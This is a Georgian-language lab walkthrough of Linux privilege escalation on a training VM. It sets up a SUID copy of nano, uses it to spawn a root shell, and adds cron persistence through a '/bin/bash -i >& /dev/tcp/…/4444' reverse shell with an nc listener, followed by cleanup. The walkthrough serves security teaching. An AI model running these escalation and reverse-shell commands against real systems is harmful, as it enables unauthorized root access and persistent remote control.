
рЃџрЃљрЃЉрЃў РђЊ Linux Privilege Escalation SUID рЃЉрЃўрЃюрЃљрЃарЃўрЃЌ (user: student, pass: 1234)
­Ъј» рЃАрЃфрЃћрЃюрЃљрЃарЃў

Ubuntu/Owasp2 рЃАрЃљрЃЏрЃўрЃќрЃюрЃћ VM-рЃерЃў рЃерЃћрЃЋрЃЊрЃўрЃЋрЃљрЃарЃЌ рЃЏрЃЮрЃЏрЃ«рЃЏрЃљрЃарЃћрЃЉрЃџрЃўрЃЌ student (рЃЕрЃЋрЃћрЃБрЃџрЃћрЃЉрЃарЃўрЃЋрЃў user). рЃАрЃўрЃАрЃбрЃћрЃЏрЃљрЃерЃў рЃАрЃърЃћрЃфрЃўрЃљрЃџрЃБрЃарЃљрЃЊ рЃљрЃарЃАрЃћрЃЉрЃЮрЃЉрЃА SUID рЃЉрЃўрЃюрЃљрЃарЃў, рЃарЃЮрЃЏрЃџрЃўрЃА exploit-рЃўрЃЌ root рЃБрЃцрЃџрЃћрЃЉрЃћрЃЉрЃА рЃЏрЃўрЃЋрЃўрЃдрЃћрЃЉрЃЌ рЃЊрЃљ рЃЉрЃЮрЃџрЃЮрЃА рЃЊрЃљрЃЋрЃљрЃДрЃћрЃюрЃћрЃЉрЃЌ persistence-рЃА.
ssh -oHostKeyAlgorithms=+ssh-rsa 172.16.50.72
STEP 1 РђЊ рЃњрЃљрЃарЃћрЃЏрЃЮрЃА рЃЏрЃЮрЃЏрЃќрЃљрЃЊрЃћрЃЉрЃљ (рЃўрЃюрЃАрЃбрЃарЃБрЃЦрЃбрЃЮрЃарЃў, Target Ubuntu/Owasp2)
# 1) nano-рЃА рЃЎрЃЮрЃърЃўрЃарЃћрЃЉрЃљ /tmp-рЃерЃў
sudo cp /bin/nano /tmp/vulnerable_nano
# рЃарЃљрЃбрЃЮрЃЏ: /tmp-рЃерЃў рЃЋрЃЦрЃЏрЃюрЃўрЃЌ рЃАрЃърЃћрЃфрЃўрЃљрЃџрЃБрЃарЃљрЃЊ рЃЊрЃљрЃБрЃфрЃЋрЃћрЃџ рЃЉрЃўрЃюрЃљрЃарЃА рЃбрЃћрЃАрЃбрЃўрЃАрЃЌрЃЋрЃўрЃА.

# 2) SUID рЃЉрЃўрЃбрЃўрЃА рЃЏрЃўрЃфрЃћрЃЏрЃљ (root-рЃўрЃА рЃАрЃљрЃ«рЃћрЃџрЃўрЃЌ рЃњрЃљрЃћрЃерЃЋрЃћрЃЉрЃљ рЃДрЃЮрЃЋрЃћрЃџрЃЌрЃЋрЃўрЃА)
sudo chmod 4755 /tmp/vulnerable_nano
# рЃарЃљрЃбрЃЮрЃЏ: 4( setuid ) + 755 => рЃњрЃљрЃерЃЋрЃћрЃЉрЃўрЃАрЃљрЃА рЃўрЃдрЃћрЃЉрЃА рЃЏрЃцрЃџрЃЮрЃЉрЃћрЃџрЃўрЃА (root) рЃБрЃцрЃџрЃћрЃЉрЃћрЃЉрЃА.

# 3) рЃЏрЃцрЃџрЃЮрЃЉрЃћрЃџрЃўрЃА рЃЊрЃљрЃбрЃЮрЃЋрЃћрЃЉрЃљ root-рЃќрЃћ
sudo chown root:root /tmp/vulnerable_nano
# рЃарЃљрЃбрЃЮрЃЏ: рЃарЃЮрЃЏ рЃњрЃљрЃерЃЋрЃћрЃЉрЃўрЃАрЃљрЃА рЃюрЃљрЃЏрЃЊрЃЋрЃўрЃџрЃљрЃЊ root-рЃўрЃА рЃБрЃцрЃџрЃћрЃЉрЃћрЃЉрЃў рЃЏрЃўрЃЋрЃўрЃдрЃЮрЃЌ.

# 4) рЃбрЃћрЃАрЃб user-рЃўрЃА рЃерЃћрЃЦрЃЏрЃюрЃљ рЃАрЃљрЃ«рЃћрЃџрЃљрЃЊ student
sudo useradd -m -s /bin/bash student
# 5) рЃърЃљрЃарЃЮрЃџрЃўрЃА рЃЊрЃљрЃДрЃћрЃюрЃћрЃЉрЃљ: 1234
echo "student:1234" | sudo chpasswd
# рЃарЃљрЃбрЃЮрЃЏ: рЃАрЃбрЃБрЃЊрЃћрЃюрЃбрЃў рЃерЃћрЃЋрЃљ рЃарЃЮрЃњрЃЮрЃарЃф рЃЕрЃЋрЃћрЃБрЃџрЃћрЃЉрЃарЃўрЃЋрЃў user рЃЊрЃљ рЃЕрЃљрЃљрЃбрЃљрЃарЃћрЃЉрЃА рЃћрЃЦрЃАрЃърЃџрЃўрЃЌрЃА.

STEP 2 РђЊ рЃЊрЃљрЃерЃЋрЃћрЃЉрЃљ рЃАрЃљрЃЏрЃўрЃќрЃюрЃћ рЃАрЃўрЃАрЃбрЃћрЃЏрЃљрЃерЃў (рЃАрЃбрЃБрЃЊрЃћрЃюрЃбрЃў, Kali Рєњ Ubuntu/Owasp2)
ssh student@UBUNTU_IP
# Password: 1234
# рЃарЃљрЃбрЃЮрЃЏ: рЃЌрЃљрЃЋрЃЊрЃљрЃърЃўрЃарЃЋрЃћрЃџрЃљрЃЊ рЃњрЃЋрЃљрЃЦрЃЋрЃА рЃЏрЃ«рЃЮрЃџрЃЮрЃЊ user access, рЃљрЃарЃљ root.

STEP 3 РђЊ рЃърЃўрЃарЃЋрЃћрЃџрЃљрЃЊрЃў рЃЊрЃљрЃќрЃЋрЃћрЃарЃЋрЃљ (Target Ubuntu/Owasp2 Рђћ user: student)
whoami
# рЃЏрЃЮрЃАрЃљрЃџрЃЮрЃЊрЃюрЃћрЃџрЃў: student
# рЃарЃљрЃбрЃЮрЃЏ: рЃЋрЃљрЃЊрЃљрЃАрЃбрЃБрЃарЃћрЃЉрЃЌ рЃарЃЮрЃЏ рЃЋрЃљрЃарЃЌ non-privileged user.

id
# uid=1001(student) gid=1001(student) groups=1001(student)
# рЃарЃљрЃбрЃЮрЃЏ: рЃЋрЃћрЃарЃљрЃцрЃћрЃарЃА рЃЋрЃ«рЃћрЃЊрЃљрЃЋрЃЌ, рЃарЃљрЃф admin рЃБрЃцрЃџрЃћрЃЉрЃћрЃЉрЃќрЃћ рЃЏрЃўрЃБрЃЌрЃўрЃЌрЃћрЃЉрЃА.

uname -a
# Linux ubuntu 4.15.0-54-generic ...
# рЃарЃљрЃбрЃЮрЃЏ: kernel рЃЋрЃћрЃарЃАрЃўрЃљ рЃњрЃЋрЃўрЃюрЃЊрЃљ рЃерЃћрЃЏрЃЊрЃњрЃЮрЃЏрЃў рЃћрЃЦрЃАрЃцрЃџрЃЮрЃўрЃбрЃћрЃЉрЃўрЃА рЃерЃћрЃАрЃљрЃЏрЃЮрЃгрЃЏрЃћрЃЉрЃџрЃљрЃЊ.

sudo -l
# Sorry, user student may not run sudo on ubuntu
# рЃарЃљрЃбрЃЮрЃЏ: sudo рЃБрЃцрЃџрЃћрЃЉрЃљ рЃљрЃа рЃњрЃЋрЃљрЃЦрЃЋрЃА, рЃљрЃЏрЃўрЃбрЃЮрЃЏ рЃАрЃ«рЃЋрЃљ рЃњрЃќрЃљрЃА рЃЋрЃћрЃФрЃћрЃЉрЃЌ Рђћ SUID.

STEP 4 РђЊ SUID рЃЉрЃўрЃюрЃљрЃарЃћрЃЉрЃўрЃА рЃФрЃћрЃЉрЃюрЃљ (Target Ubuntu/Owasp2 Рђћ user: student)
find / -perm -4000 -type f 2>/dev/null
# рЃарЃљрЃбрЃЮрЃЏ: рЃЋрЃћрЃФрЃћрЃЉрЃЌ рЃДрЃЋрЃћрЃџрЃљ рЃцрЃљрЃўрЃџрЃА setuid рЃЉрЃўрЃбрЃўрЃЌ, рЃарЃЮрЃЏрЃџрЃћрЃЉрЃўрЃф рЃњрЃљрЃерЃЋрЃћрЃЉрЃўрЃАрЃљрЃА рЃЏрЃцрЃџрЃЮрЃЉрЃћрЃџрЃўрЃА
# (рЃ«рЃерЃўрЃарЃљрЃЊ root-рЃўрЃА) рЃБрЃцрЃџрЃћрЃЉрЃћрЃЉрЃўрЃЌ рЃЏрЃБрЃерЃљрЃЮрЃЉрЃћрЃю рЃЊрЃљ рЃерЃћрЃАрЃљрЃФрЃџрЃЮрЃљ рЃърЃарЃўрЃЋрЃўрЃџрЃћрЃњрЃўрЃўрЃА рЃљрЃАрЃљрЃгрЃћрЃЋрЃљрЃЊ рЃњрЃљрЃЏрЃЮрЃњрЃЋрЃљрЃЊрЃњрЃћрЃА.


рЃЏрЃЮрЃАрЃљрЃџрЃЮрЃЊрЃюрЃћрЃџрЃў рЃљрЃЏрЃЮрЃюрЃљрЃгрЃћрЃарЃў (рЃерЃћрЃЏрЃЮрЃЎрЃџрЃћрЃЉрЃБрЃџрЃў):

/usr/bin/passwd
/usr/bin/chsh
/bin/su
/tmp/vulnerable_nano   Рєљ рЃЕрЃЋрЃћрЃюрЃў рЃАрЃљрЃЏрЃўрЃќрЃюрЃћ

STEP 5 РђЊ рЃАрЃљрЃЏрЃўрЃќрЃюрЃћ рЃЉрЃўрЃюрЃљрЃарЃўрЃА рЃљрЃбрЃарЃўрЃЉрЃБрЃбрЃћрЃЉрЃў (Target Ubuntu/Owasp2 Рђћ user: student)
ls -la /tmp/vulnerable_nano
# -rwsr-xr-x 1 root root ... /tmp/vulnerable_nano
# рЃарЃљрЃбрЃЮрЃЏ: -rws рЃЏрЃўрЃБрЃЌрЃўрЃЌрЃћрЃЉрЃА SUID-рЃќрЃћ; рЃЏрЃцрЃџрЃЮрЃЉрЃћрЃџрЃў root Рђћ рЃќрЃБрЃАрЃбрЃљрЃЊ рЃћрЃА рЃњрЃЋрЃГрЃўрЃарЃЊрЃћрЃЉрЃљ.

STEP 6 РђЊ Exploitation GTFOBins рЃџрЃЮрЃњрЃўрЃЎрЃўрЃЌ (Target Ubuntu/Owasp2 Рђћ user: student)

GTFOBins рЃљрЃарЃўрЃА рЃЮрЃюрЃџрЃљрЃўрЃю рЃЎрЃљрЃбрЃљрЃџрЃЮрЃњрЃў, рЃАрЃљрЃЊрЃљрЃф рЃљрЃдрЃгрЃћрЃарЃўрЃџрЃўрЃљ рЃарЃЮрЃњрЃЮрЃа рЃерЃћрЃўрЃФрЃџрЃћрЃЉрЃљ рЃќрЃЮрЃњрЃљрЃЊрЃў рЃЉрЃўрЃюрЃљрЃарЃћрЃЉрЃўрЃА рЃњрЃљрЃЏрЃЮрЃДрЃћрЃюрЃћрЃЉрЃљ рЃърЃарЃўрЃЋрЃўрЃџрЃћрЃњрЃўрЃўрЃА рЃљрЃАрЃљрЃгрЃћрЃЋрЃљрЃЊ, рЃЌрЃБ рЃЏрЃљрЃЌ рЃљрЃЦрЃЋрЃЌ SUID/sudo рЃЊрЃљ рЃЉрЃарЃФрЃљрЃюрЃћрЃЉрЃўрЃА рЃњрЃљрЃерЃЋрЃћрЃЉрЃўрЃА рЃБрЃюрЃљрЃарЃў.

6.1 рЃцрЃљрЃўрЃџрЃўрЃА рЃњрЃљрЃ«рЃАрЃюрЃљ SUID nano-рЃЌрЃў (рЃњрЃљрЃерЃЋрЃЊрЃћрЃЉрЃљ root-рЃўрЃА рЃБрЃцрЃџрЃћрЃЉрЃћрЃЉрЃўрЃЌ)
/tmp/vulnerable_nano -T4 /etc/passwd
# рЃарЃљрЃбрЃЮрЃЏ: /etc/passwd root-рЃА рЃћрЃЎрЃБрЃЌрЃЋрЃюрЃўрЃА; nano SUID-рЃўрЃљ рЃЊрЃљ root рЃБрЃцрЃџрЃћрЃЉрЃћрЃЉрЃўрЃЌ рЃњрЃљрЃ«рЃАрЃюрЃўрЃА.
# -T4 рЃбрЃљрЃЉрЃБрЃџрЃљрЃфрЃўрЃўрЃА рЃќрЃЮрЃЏрЃљрЃљ; рЃљрЃЦ рЃЏрЃюрЃўрЃерЃЋрЃюрЃћрЃџрЃЮрЃЋрЃљрЃюрЃў рЃўрЃАрЃљрЃљ, рЃарЃЮрЃЏ nano SUID-рЃўрЃЌ рЃњрЃљрЃерЃЋрЃЊрЃљ.

6.2 рЃЉрЃарЃФрЃљрЃюрЃћрЃЉрЃўрЃА рЃњрЃљрЃерЃЋрЃћрЃЉрЃљ nano-рЃА рЃерЃўрЃњрЃюрЃўрЃЌ root рЃЎрЃЮрЃюрЃбрЃћрЃЦрЃАрЃбрЃерЃў

рЃЊрЃљрЃљрЃГрЃўрЃарЃћ Ctrl+R (Read File)

рЃЊрЃљрЃљрЃГрЃўрЃарЃћ Ctrl+X (Execute Command)

рЃљрЃЎрЃарЃўрЃцрЃћ рЃЊрЃљ Enter:

reset; sh 1>&0 2>&0


рЃарЃљрЃбрЃЮрЃЏ: sh рЃ«рЃАрЃюрЃўрЃА shell-рЃА. 1>&0 2>&0 рЃюрЃўрЃерЃюрЃљрЃЋрЃА STDOUT/STDERR/STDIN-рЃўрЃА рЃЏрЃўрЃЉрЃЏрЃљрЃА рЃбрЃћрЃарЃЏрЃўрЃюрЃљрЃџрЃќрЃћ, рЃљрЃЏрЃўрЃбрЃЮрЃЏ root shell рЃърЃўрЃарЃЊрЃљрЃърЃўрЃа рЃбрЃћрЃарЃЏрЃўрЃюрЃљрЃџрЃерЃў рЃњрЃЋрЃћрЃЏрЃљрЃарЃЌрЃћрЃЉрЃљ.

STEP 7 РђЊ Root-рЃўрЃА рЃЊрЃљрЃЊрЃљрЃАрЃбрЃБрЃарЃћрЃЉрЃљ (Target Ubuntu/Owasp2 Рђћ рЃљрЃ«рЃџрЃљ рЃБрЃЎрЃЋрЃћ root shell)
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)
# рЃарЃљрЃбрЃЮрЃЏ: рЃЋрЃљрЃЊрЃљрЃАрЃбрЃБрЃарЃћрЃЉрЃЌ, рЃарЃЮрЃЏ рЃњрЃЋрЃћрЃЦрЃфрЃљ root рЃърЃарЃўрЃЋрЃўрЃџрЃћрЃњрЃўрЃљ.

STEP 8 РђЊ Persistence cron-рЃўрЃЌ (Target Ubuntu/Owasp2 Рђћ root shell)

Kali-рЃќрЃћ рЃЏрЃЮрЃЋрЃљрЃЏрЃќрЃљрЃЊрЃЮрЃЌ listener:

nc -lvnp 4444
# рЃарЃљрЃбрЃЮрЃЏ: рЃарЃљрЃЌрЃљ рЃЏрЃўрЃЋрЃўрЃдрЃЮрЃЌ рЃБрЃЎрЃБ-рЃерЃћрЃџрЃў рЃАрЃљрЃЏрЃўрЃќрЃюрЃћрЃЊрЃљрЃю.


Target Ubuntu/Owasp2 (root shell):

# рЃўрЃърЃЮрЃЋрЃћ Kali-рЃўрЃА IP (Kali-рЃќрЃћ: ip addr show). рЃЋрЃЌрЃЦрЃЋрЃљрЃЌ 192.168.56.101.
echo "*/5 * * * * /bin/bash -i >& /dev/tcp/192.168.56.101/4444 0>&1" > /tmp/cron_job
# рЃарЃљрЃбрЃЮрЃЏ: рЃДрЃЮрЃЋрЃћрЃџ 5 рЃгрЃБрЃЌрЃерЃў рЃАрЃљрЃЏрЃўрЃќрЃюрЃћ рЃЊрЃљрЃњрЃЋрЃўрЃарЃћрЃЎрЃљрЃЋрЃА рЃЊрЃљ рЃЏрЃЮрЃњрЃЋрЃфрЃћрЃЏрЃА root reverse shell-рЃА.

crontab /tmp/cron_job
# рЃарЃљрЃбрЃЮрЃЏ: рЃЋрЃљрЃЏрЃљрЃбрЃћрЃЉрЃЌ рЃљрЃЏ рЃЕрЃљрЃюрЃљрЃгрЃарЃА рЃЏрЃўрЃЏрЃЊрЃўрЃюрЃљрЃарЃћ рЃЏрЃЮрЃЏрЃ«рЃЏрЃљрЃарЃћрЃЉрЃџрЃўрЃА (root) crontab-рЃерЃў.

crontab -l
# рЃБрЃюрЃЊрЃљ рЃњрЃљрЃЏрЃЮрЃЕрЃюрЃЊрЃћрЃА:
# */5 * * * * /bin/bash -i >& /dev/tcp/192.168.56.101/4444 0>&1


5 рЃгрЃБрЃЌрЃўрЃА рЃерЃћрЃЏрЃЊрЃћрЃњ Kali listener-рЃќрЃћ рЃБрЃюрЃЊрЃљ рЃЊрЃљрЃўрЃюрЃљрЃ«рЃЮ:

Connection received on 192.168.56.102 ...
root@ubuntu:~# whoami
root
# рЃарЃљрЃбрЃЮрЃЏ: Persistence рЃўрЃЏрЃБрЃерЃљрЃЋрЃљ; рЃДрЃЮрЃЋрЃћрЃџ 5 рЃгрЃБрЃЌрЃерЃў рЃњрЃўрЃЉрЃарЃБрЃюрЃћрЃЉрЃА root access-рЃА.

­ЪД╣ Cleanup (рЃАрЃБрЃарЃЋрЃўрЃџрЃўрЃАрЃљрЃЏрЃћрЃЉрЃа)
# Target Ubuntu/Owasp2 Рђћ root shell
crontab -r                            # Persistence рЃљрЃЏрЃЮрЃ«рЃАрЃюрЃљ
rm -f /tmp/vulnerable_nano            # рЃЊрЃљрЃБрЃфрЃЋрЃћрЃџрЃў SUID рЃцрЃљрЃўрЃџрЃўрЃА рЃгрЃљрЃерЃџрЃљ
userdel -r student                    # рЃбрЃћрЃАрЃб рЃЏрЃЮрЃЏрЃ«рЃЏрЃљрЃарЃћрЃЉрЃџрЃўрЃА рЃгрЃљрЃерЃџрЃљ (рЃцрЃарЃЌрЃ«рЃўрЃџрЃљрЃЊ!)

­Ъћј рЃЏрЃЮрЃЎрЃџрЃћ рЃџрЃЮрЃњрЃўрЃЎрЃљ/рЃЊрЃљрЃАрЃЎрЃЋрЃюрЃљ

SUID рЃЉрЃўрЃюрЃљрЃарЃў рЃњрЃљрЃерЃЋрЃћрЃЉрЃўрЃАрЃљрЃА рЃўрЃдрЃћрЃЉрЃА рЃЏрЃцрЃџрЃЮрЃЉрЃћрЃџрЃўрЃА рЃБрЃцрЃџрЃћрЃЉрЃћрЃЉрЃА (рЃБрЃцрЃарЃЮ рЃ«рЃерЃўрЃарЃљрЃЊ root).

рЃЌрЃБ рЃЉрЃўрЃюрЃљрЃарЃА рЃерЃћрЃБрЃФрЃџрЃўрЃљ рЃЉрЃарЃФрЃљрЃюрЃћрЃЉрЃўрЃА рЃњрЃљрЃерЃЋрЃћрЃЉрЃљ (nano, vim, find, awk, python, perlРђд), рЃЏрЃљрЃерЃўрЃю рЃерЃћрЃўрЃФрЃџрЃћрЃЉрЃљ рЃЏрЃўрЃЋрЃўрЃдрЃЮрЃЌ root shell.

GTFOBins рЃњрЃЋрЃћрЃ«рЃЏрЃљрЃарЃћрЃЉрЃљ рЃАрЃгрЃЮрЃарЃў рЃЦрЃфрЃћрЃЋрЃўрЃА рЃюрЃўрЃЏрЃБрЃерЃўрЃА рЃЏрЃЮрЃФрЃћрЃЉрЃюрЃљрЃерЃў.

cron persistence рЃБрЃќрЃарЃБрЃюрЃЋрЃћрЃџрЃДрЃЮрЃцрЃА рЃЊрЃљрЃЉрЃарЃБрЃюрЃћрЃЉрЃљрЃЊ рЃгрЃЋрЃЊрЃЮрЃЏрЃљрЃА root-рЃўрЃЌ.
